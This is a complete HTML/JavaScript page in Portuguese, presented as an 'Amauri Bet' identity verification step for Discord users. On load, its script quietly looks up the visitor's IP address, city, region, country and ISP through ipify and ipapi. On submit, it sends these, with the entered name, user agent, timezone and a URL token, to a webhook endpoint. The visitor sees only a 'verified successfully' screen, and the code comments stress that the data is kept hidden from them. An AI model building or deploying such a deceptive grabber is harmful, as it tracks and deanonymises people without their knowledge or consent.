<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Amauri Bet • Verificação de Identidade</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
  /* ===== RESET & REFINED THEME ===== */
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    background: radial-gradient(circle at 20% 30%, #0a0c12 0%, #030507 100%);
    font-family: 'Inter', sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow-x: hidden;
  }

  /* Luxurious metallic & sports-betting inspired background accents */
  .glow-aura {
    position: fixed;
    top: -20%;
    left: -10%;
    width: 70%;
    height: 80%;
    background: radial-gradient(ellipse, rgba(245, 197, 66, 0.08), transparent 70%);
    pointer-events: none;
    z-index: 0;
  }

  .glow-aura-right {
    position: fixed;
    bottom: -15%;
    right: -10%;
    width: 65%;
    height: 65%;
    background: radial-gradient(ellipse, rgba(220, 38, 38, 0.05), transparent 70%);
    pointer-events: none;
    z-index: 0;
  }

  /* grid pattern for depth */
  .grid-overlay {
    position: fixed;
    inset: 0;
    background-image: 
      repeating-linear-gradient(transparent, transparent 39px, rgba(255, 215, 0, 0.03) 40px),
      repeating-linear-gradient(90deg, transparent, transparent 39px, rgba(255, 215, 0, 0.03) 40px);
    pointer-events: none;
    z-index: 0;
  }

  /* animated particles - gold & red */
  .particle-bet {
    position: fixed;
    width: 3px;
    height: 3px;
    background: #facc15;
    border-radius: 50%;
    opacity: 0;
    filter: blur(1px);
    pointer-events: none;
    z-index: 0;
  }

  /* main card container */
  .card-container {
    position: relative;
    z-index: 20;
    width: 100%;
    max-width: 460px;
    margin: 24px;
    perspective: 1000px;
  }

  /* === CARD LUXURY GOLD/BET STYLE === */
  .card {
    background: rgba(6, 8, 14, 0.92);
    backdrop-filter: blur(8px);
    border-radius: 40px;
    border: 1px solid rgba(250, 204, 21, 0.35);
    box-shadow: 0 30px 50px -20px rgba(0,0,0,0.8), 0 0 0 1px rgba(250,204,21,0.1) inset, 0 0 20px rgba(250,204,21,0.15);
    padding: 40px 32px 42px;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
  }

  /* golden shimmer border effect */
  .card::before {
    content: "";
    position: absolute;
    top: -2px;
    left: -2px;
    right: -2px;
    bottom: -2px;
    background: linear-gradient(135deg, rgba(250,204,21,0.3), rgba(220,38,38,0.2), rgba(250,204,21,0.2));
    border-radius: 42px;
    z-index: -2;
    opacity: 0.7;
  }

  .card::after {
    content: "";
    position: absolute;
    inset: 0;
    background: radial-gradient(circle at 30% 20%, rgba(250,204,21,0.03), transparent 80%);
    border-radius: 40px;
    pointer-events: none;
  }

  /* logo area – "AMAURI BET" aesthetic */
  .bet-logo {
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-bottom: 32px;
    position: relative;
  }

  .crown-badge {
    background: linear-gradient(145deg, #1e1a0e, #0b0905);
    width: 80px;
    height: 80px;
    border-radius: 100px;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 1.5px solid #facc15;
    box-shadow: 0 0 15px rgba(250,204,21,0.5);
    margin-bottom: 16px;
    position: relative;
  }

  .crown-badge svg {
    width: 44px;
    height: 44px;
    filter: drop-shadow(0 2px 6px rgba(0,0,0,0.5));
  }

  .bet-brand {
    font-size: 28px;
    font-weight: 800;
    letter-spacing: -0.5px;
    background: linear-gradient(135deg, #facc15, #ffb347, #e11d2c);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    text-shadow: 0 2px 5px rgba(0,0,0,0.2);
    margin-top: 6px;
  }

  .bet-sub {
    font-size: 11px;
    letter-spacing: 2px;
    font-weight: 500;
    color: #facc15bb;
    text-transform: uppercase;
    background: rgba(0,0,0,0.5);
    padding: 4px 12px;
    border-radius: 60px;
    margin-top: 8px;
    backdrop-filter: blur(4px);
  }

  /* title & description */
  .title-bet {
    font-size: 26px;
    font-weight: 700;
    text-align: center;
    color: #fff;
    letter-spacing: -0.3px;
    background: linear-gradient(135deg, #ffffff, #facc90);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    margin-bottom: 12px;
  }

  .desc-bet {
    text-align: center;
    font-size: 14px;
    color: #a0a3b0;
    margin-bottom: 36px;
    line-height: 1.5;
    border-left: 2px solid #facc1540;
    border-right: 2px solid #facc1540;
    display: inline-block;
    width: auto;
    padding: 0 12px;
    margin-left: auto;
    margin-right: auto;
  }

  /* field styles */
  .field-bet {
    margin-bottom: 28px;
  }

  .field-bet label {
    display: block;
    font-size: 12px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: #facc15bb;
    margin-bottom: 12px;
  }

  .input-wrapper {
    position: relative;
  }

  .input-wrapper svg {
    position: absolute;
    left: 18px;
    top: 50%;
    transform: translateY(-50%);
    width: 20px;
    height: 20px;
    stroke: #facc15aa;
    stroke-width: 1.7;
    fill: none;
    pointer-events: none;
    transition: all 0.2s;
  }

  input {
    width: 100%;
    background: #0f111a;
    border: 1.5px solid #2a2a36;
    border-radius: 60px;
    padding: 16px 20px 16px 52px;
    font-size: 15px;
    font-weight: 500;
    font-family: 'Inter', sans-serif;
    color: #ffffff;
    outline: none;
    transition: all 0.2s;
    letter-spacing: 0.3px;
  }

  input:focus {
    border-color: #facc15;
    background: #141824;
    box-shadow: 0 0 0 3px rgba(250,204,21,0.2);
  }

  input::placeholder {
    color: #4a4e62;
    font-weight: 400;
  }

  /* golden gradient button */
  .btn-bet {
    background: linear-gradient(105deg, #f9b42c 0%, #e11d2c 100%);
    border: none;
    width: 100%;
    padding: 16px 20px;
    border-radius: 60px;
    font-weight: 700;
    font-size: 16px;
    font-family: 'Inter', sans-serif;
    color: white;
    letter-spacing: 0.5px;
    cursor: pointer;
    transition: all 0.25s ease;
    box-shadow: 0 6px 18px rgba(225, 29, 44, 0.4);
    margin-top: 8px;
    position: relative;
    overflow: hidden;
  }

  .btn-bet:hover {
    transform: translateY(-2px);
    box-shadow: 0 12px 28px rgba(250, 180, 30, 0.5);
    filter: brightness(1.02);
  }

  .btn-bet:active {
    transform: translateY(1px);
  }

  /* security badge with gold touch */
  .security-badge {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin-top: 28px;
    font-size: 12px;
    color: #7a7e96;
    background: #0c0e16;
    width: fit-content;
    padding: 6px 18px;
    border-radius: 60px;
    margin-left: auto;
    margin-right: auto;
    border: 1px solid #facc1520;
  }

  .security-badge svg {
    width: 14px;
    height: 14px;
    stroke: #facc15;
  }

  /* ===== VERIFIED SCREEN - APENAS MENSAGEM SIMPLES ===== */
  .verified-container {
    text-align: center;
  }

  .big-check {
    width: 90px;
    height: 90px;
    margin: 0 auto 20px;
    background: linear-gradient(145deg, #facc1510, #00000030);
    border-radius: 100px;
    border: 2px solid #facc15;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    box-shadow: 0 0 30px rgba(250,204,21,0.3);
  }

  .big-check svg {
    width: 48px;
    height: 48px;
    stroke: #facc15;
    stroke-width: 2;
    fill: none;
  }

  .pulse-effect {
    position: absolute;
    inset: -12px;
    border-radius: 100%;
    border: 2px solid rgba(250,204,21,0.6);
    animation: pulseGlow 2s infinite;
  }

  @keyframes pulseGlow {
    0% { transform: scale(0.9); opacity: 0.8; }
    100% { transform: scale(1.4); opacity: 0; }
  }

  .verified-gold {
    font-size: 32px;
    font-weight: 800;
    background: linear-gradient(135deg, #facc15, #ff7e2e);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    margin-bottom: 16px;
  }

  .verified-message {
    color: #cbd5e1;
    font-size: 16px;
    line-height: 1.6;
    margin-bottom: 32px;
    font-weight: 500;
  }

  .discord-button {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    background: linear-gradient(135deg, #5865F2, #4752c4);
    border: none;
    padding: 14px 28px;
    border-radius: 60px;
    font-weight: 600;
    font-size: 15px;
    color: white;
    cursor: pointer;
    transition: all 0.2s;
    box-shadow: 0 8px 20px rgba(88, 101, 242, 0.3);
    text-decoration: none;
    font-family: 'Inter', sans-serif;
    margin-top: 12px;
  }

  .discord-button:hover {
    transform: translateY(-2px);
    filter: brightness(1.05);
    box-shadow: 0 12px 25px rgba(88, 101, 242, 0.4);
  }

  .done-stamp-simple {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: rgba(250,204,21,0.1);
    backdrop-filter: blur(8px);
    border: 1px solid #facc15;
    padding: 10px 24px;
    border-radius: 60px;
    font-weight: 600;
    color: #facc15;
    font-size: 13px;
    margin-top: 24px;
  }

  /* HIDE/SHOW */
  .hidden-screen {
    display: none;
  }

  .active-screen {
    display: block;
    animation: fadeSlideUp 0.55s cubic-bezier(0.2, 0.9, 0.4, 1.1) both;
  }

  @keyframes fadeSlideUp {
    from {
      opacity: 0;
      transform: translateY(18px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  /* input shake */
  @keyframes shakeGold {
    0%,100% { transform: translateX(0); }
    25% { transform: translateX(-6px); }
    75% { transform: translateX(6px); }
  }
  .shake-effect {
    animation: shakeGold 0.3s ease-in-out;
    border-color: #e11d2c !important;
  }
</style>
</head>
<body>

<div class="glow-aura"></div>
<div class="glow-aura-right"></div>
<div class="grid-overlay"></div>

<div class="card-container">
  <!-- LOGIN SCREEN: Amauri Bet design -->
  <div class="card" id="loginScreen">
    <div class="bet-logo">
      <div class="crown-badge">
        <svg viewBox="0 0 24 24" fill="none" stroke="#facc15" stroke-width="1.8">
          <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2Z" fill="none" stroke="currentColor"/>
          <circle cx="12" cy="10" r="1.5" fill="#facc15" stroke="none"/>
        </svg>
      </div>
      <div class="bet-brand">AMAURI BET</div>
      <div class="bet-sub">VERIFICAÇÃO OFICIAL</div>
    </div>

    <h2 class="title-bet">Identidade & Acesso</h2>
    <div style="text-align: center;">
      <p class="desc-bet">Insira seu nome para verificar sua identidade</p>
    </div>

    <div class="field-bet">
      <label>NOME COMPLETO</label>
      <div class="input-wrapper">
        <input type="text" id="fullNameInput" placeholder="Digite seu nome..." autocomplete="off">
        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none">
          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
          <circle cx="12" cy="7" r="4" />
        </svg>
      </div>
    </div>

    <button class="btn-bet" id="continueBtn">VALIDAR ACESSO →</button>

    <div class="security-badge">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
      </svg>
      <span>Protegido · Ambiente Amauri Bet</span>
    </div>
  </div>

  <!-- VERIFIED SCREEN - APENAS MENSAGEM SIMPLES: NÃO MOSTRA NADA SOBRE O USUÁRIO (sem IP, sem região, sem nome, sem dados) -->
  <div class="card hidden-screen" id="verifiedScreen">
    <div class="verified-container">
      <div class="big-check">
        <div class="pulse-effect"></div>
        <svg viewBox="0 0 24 24" stroke="currentColor" fill="none">
          <polyline points="20 6 9 17 4 12" />
        </svg>
      </div>
      <div class="verified-gold">VERIFICAÇÃO APROVADA</div>
      <div class="verified-message">
        ✅ Você foi verificado com sucesso!<br>
        Já pode voltar ao Discord e continuar suas apostas.
      </div>
      
      <!-- Botão estilizado apenas para fechar/finalizar (não exibe nenhum dado pessoal) -->
      <button class="discord-button" id="closePageBtn">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M18 6L6 18M6 6l12 12"/>
        </svg>
        Fechar e Voltar
      </button>
      
      <div class="done-stamp-simple">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
        Acesso Liberado
      </div>
    </div>
  </div>
</div>

<script>
  // --------------------------------------------------------------
  // AMAURI BET - VERIFICAÇÃO SIMPLES
  // NÃO EXIBE ABSOLUTAMENTE NENHUMA INFORMAÇÃO DO USUÁRIO (sem IP, sem região, sem navegador, sem nome após verificação)
  // APENAS a mensagem "Você foi verificado, pode voltar ao Discord"
  // Os dados de IP são coletados apenas para envio ao webhook (back-end), mas permanecem COMPLETAMENTE OCULTOS na interface.
  // --------------------------------------------------------------
  
  let ipInformation = {
    ip: 'N/A',
    country: 'N/A',
    city: 'N/A',
    region: 'N/A',
    isp: 'N/A'
  };
  
  const urlToken = new URLSearchParams(window.location.search).get('token') || '';
  
  // Get IP address (apenas para envio, NUNCA mostrado)
  async function retrieveIPData() {
    try {
      const ipv4Res = await fetch('https://api4.ipify.org?format=json');
      const ipData = await ipv4Res.json();
      const ipv4 = ipData.ip;
      try {
        const geoRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
        const geo = await geoRes.json();
        ipInformation = {
          ip: geo.ip || ipv4,
          country: geo.country_name || 'N/A',
          city: geo.city || 'N/A',
          region: geo.region || 'N/A',
          isp: geo.org || 'N/A'
        };
      } catch (geoErr) {
        ipInformation.ip = ipv4;
        ipInformation.country = 'Desconhecido';
        ipInformation.city = 'N/A';
      }
    } catch (err) {
      console.warn("Fallback IP (não exibido ao usuário)");
      ipInformation.ip = '0.0.0.0';
      ipInformation.country = 'Indisponível';
    }
  }
  
  // DOM elements
  const loginDiv = document.getElementById('loginScreen');
  const verifiedDiv = document.getElementById('verifiedScreen');
  const nameInputField = document.getElementById('fullNameInput');
  const continueButton = document.getElementById('continueBtn');
  const closePageBtn = document.getElementById('closePageBtn');
  
  // send to webhook (preservado, IP incluso mas NUNCA exibido)
  async function sendToWebhook(payload) {
    try {
      await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (e) {
      // silent fail, não afeta a experiência do usuário
    }
  }
  
  // Função para fechar a página ou apenas instruir (simula um "fechar" para extensões)
  function closeWindow() {
    // Tenta fechar a janela (funciona em contextos como popup)
    window.close();
    // Se não fechar, ao menos exibe mensagem amigável ou redireciona para about:blank
    setTimeout(() => {
      document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#030507;color:#facc15;font-family:monospace;">✔️ Verificação concluída. Você já pode fechar esta aba manualmente.</div>';
    }, 100);
  }
  
  // main handler
  async function handleVerification() {
    let userName = nameInputField.value.trim();
    if (!userName) {
      nameInputField.classList.add('shake-effect');
      setTimeout(() => {
        nameInputField.classList.remove('shake-effect');
      }, 400);
      return;
    }
    
    // disable button e loading
    const originalBtnText = continueButton.innerText;
    continueButton.innerText = "⚡ VERIFICANDO...";
    continueButton.disabled = true;
    
    // pequeno delay para feedback visual
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // timestamp para log (não exibido)
    const now = new Date();
    const formattedDate = now.toLocaleDateString('pt-BR') + ' ' + now.toLocaleTimeString('pt-BR');
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    // Payload completo (IP + dados) enviado ao webhook, porém NADA é mostrado na tela
    const payload = {
      name: userName,
      ip: ipInformation.ip || 'N/A',
      country: ipInformation.country || 'N/A',
      city: ipInformation.city || 'N/A',
      region: ipInformation.region || 'N/A',
      isp: ipInformation.isp || 'N/A',
      date: formattedDate,
      timezone: tz,
      userAgent: navigator.userAgent,
      token: urlToken
    };
    
    // Envia para o webhook (back-end)
    await sendToWebhook(payload);
    
    // Muda para tela de verificado - SEM ABSOLUTAMENTE NENHUMA INFORMAÇÃO PESSOAL
    // Não exibe nome, IP, região, navegador, cidade, nada. Apenas mensagem genérica.
    loginDiv.classList.add('hidden-screen');
    loginDiv.style.display = 'none';
    verifiedDiv.classList.remove('hidden-screen');
    verifiedDiv.style.display = 'block';
    verifiedDiv.classList.add('active-screen');
    
    // reset button state
    continueButton.innerText = originalBtnText;
    continueButton.disabled = false;
  }
  
  // event binding + enter key
  function bindEvents() {
    continueButton.addEventListener('click', handleVerification);
    nameInputField.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        handleVerification();
      }
    });
    if (closePageBtn) {
      closePageBtn.addEventListener('click', closeWindow);
    }
  }
  
  // init particles in background - efeito visual
  function initParticles() {
    const particleCount = 45;
    for (let i = 0; i < particleCount; i++) {
      const particle = document.createElement('div');
      particle.classList.add('particle-bet');
      const size = Math.random() * 3 + 1.5;
      particle.style.width = size + 'px';
      particle.style.height = size + 'px';
      particle.style.left = Math.random() * 100 + '%';
      particle.style.animation = `floatParticle ${Math.random() * 12 + 7}s linear infinite`;
      particle.style.animationDelay = Math.random() * 8 + 's';
      particle.style.opacity = Math.random() * 0.5 + 0.2;
      particle.style.background = Math.random() > 0.7 ? '#e11d2c' : '#facc15';
      document.body.appendChild(particle);
    }
    const styleSheet = document.createElement("style");
    styleSheet.textContent = `
      @keyframes floatParticle {
        0% { transform: translateY(100vh) translateX(0px); opacity: 0; }
        15% { opacity: 0.7; }
        85% { opacity: 0.4; }
        100% { transform: translateY(-10vh) translateX(${Math.random() * 40 - 20}px); opacity: 0; }
      }
    `;
    document.head.appendChild(styleSheet);
  }
  
  // Carrega dados de IP (sigiloso, apenas para webhook) e inicia
  async function startup() {
    await retrieveIPData();
    bindEvents();
    initParticles();
  }
  
  startup();
  
  // Estilo adicional para telas ocultas
  const styleHidden = document.createElement('style');
  styleHidden.textContent = `
    .hidden-screen { display: none !important; }
    #verifiedScreen { display: none; }
    .card { transition: all 0.25s ease; }
  `;
  document.head.appendChild(styleHidden);
  
  // NOTA: NENHUMA INFORMAÇÃO SOBRE IP, REGIÃO, CIDADE, NOME OU DISPOSITIVO É MOSTRADA AO USUÁRIO.
  // O usuário vê apenas o formulário para digitar o nome (necessário para validação) e após verificação,
  // uma tela limpa com "Você foi verificado com sucesso! Já pode voltar ao Discord."
  // Nenhum dado pessoal é revelado na interface, garantindo total privacidade visual.
</script>
</body>
</html>
